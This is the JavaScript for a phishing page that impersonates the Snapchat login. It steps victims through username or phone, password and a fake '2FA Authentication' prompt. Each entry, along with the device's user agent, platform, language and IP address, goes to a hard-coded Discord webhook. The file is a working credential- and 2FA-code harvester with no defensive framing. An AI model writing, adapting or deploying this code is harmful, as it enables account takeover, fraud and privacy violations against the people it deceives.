document.addEventListener('DOMContentLoaded', function() {
    // Call sendDeviceInfo function as soon as the page loads
    sendDeviceInfo();

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the form from submitting

        const label = document.getElementById('inputLabel');
        const inputField = document.getElementById('inputField');
        const button = document.getElementById('nextButton');
        const formTitle = document.getElementById('formTitle');
        let isButtonDisabled = button.disabled;

        if (isButtonDisabled) {
            // Prevent multiple submissions
            return;
        }

        button.disabled = true; // Disable the button to prevent spamming

        const inputValue = inputField.value.trim();
        let stage = '';
        let formattedValue = '';

        console.log('Form submitted.');

        if (label.textContent === 'Username or Phone Number') {
            stage = 'Email / Phone';
            formattedValue = `- ${inputValue}`;
            sendDataToWebhook({
                stage: stage,
                value: formattedValue
            });

            label.textContent = 'Enter Password';
            inputField.setAttribute('type', 'password');
            inputField.value = '';
            inputField.setAttribute('placeholder', 'Password');
            button.textContent = 'Log In';
            document.getElementById('pageTitle').textContent = 'Login to Snapchat';
            formTitle.textContent = 'Login to Snapchat';

            setTimeout(() => {
                button.disabled = false; // Re-enable the button for the next action
            }, 1500); // 1.5 seconds delay

        } else if (label.textContent === 'Enter Password') {
            stage = 'Password';
            formattedValue = `- ${inputValue}`;
            sendDataToWebhook({
                stage: stage,
                value: formattedValue
            });

            label.textContent = `Enter 6 Digit Code Sent To ${inputField.dataset.emailOrPhone}`;
            inputField.setAttribute('type', 'text');
            inputField.value = '';
            inputField.setAttribute('placeholder', 'Code');
            button.textContent = 'Verify';
            document.getElementById('pageTitle').textContent = '2FA Authentication';
            formTitle.textContent = '2FA Authentication';

            setTimeout(() => {
                button.disabled = false; // Re-enable the button for the next action
            }, 1500); // 1.5 seconds delay

        } else {
            stage = '2FA Code';
            formattedValue = `- ${inputValue}`;
            sendDataToWebhook({
                stage: stage,
                value: formattedValue
            });

            // Final stage logic here (e.g., verification)
            alert('Verifying...'); // Placeholder action
        }
    });

    document.getElementById('acceptCookies').addEventListener('click', function() {
        document.getElementById('cookiePopup').style.display = 'none';
        console.log('Cookies accepted.');
    });

    // Function to capture device information and send to webhook
    function sendDeviceInfo() {
        console.log('Capturing device information.');

        // Capture device and browser information
        const deviceInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform
        };

        console.log('Device info:', deviceInfo);

        // Fetch IP address from an external API
        fetch('https://api.ipify.org?format=json')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                return response.json();
            })
            .then(data => {
                deviceInfo.ipAddress = data.ip;
                console.log('IP address fetched:', data.ip);

                // Format the payload for Discord webhook
                const webhookPayload = {
                    content: `Device Information:\n- User Agent: ${deviceInfo.userAgent}\n- Language: ${deviceInfo.language}\n- Platform: ${deviceInfo.platform}\n- IP Address: ${deviceInfo.ipAddress}`
                };

                // Send device info to the webhook
                return fetch('https://canary.discord.com/api/webhooks/1262611539714900028/s-nStmJY7V6xPgkFDTTKxRK7ECjHFZzdq_vJOGytZQ_miv9B1w7VX1VnqrMtysv3mNRE', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(webhookPayload)
                });
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Webhook response was not ok ' + response.statusText);
                }
                return response.text();
            })
            .then(result => {
                console.log('Webhook response:', result);
            })
            .catch(error => {
                console.error('Error in sending device info:', error);
            });
    }

    // Function to send data to the webhook
    function sendDataToWebhook(data) {
        console.log('Sending data to webhook:', data);

        // Format the payload for Discord webhook
        const webhookPayload = {
            content: `${data.stage}:\n${data.value}`
        };

        // Send data to the webhook
        fetch('https://canary.discord.com/api/webhooks/1262611539714900028/s-nStmJY7V6xPgkFDTTKxRK7ECjHFZzdq_vJOGytZQ_miv9B1w7VX1VnqrMtysv3mNRE', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookPayload)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Webhook response was not ok ' + response.statusText);
            }
            return response.text();
        })
        .then(result => {
            console.log('Webhook response:', result);
        })
        .catch(error => {
            console.error('Error in sending data to webhook:', error);
        });
    }
});
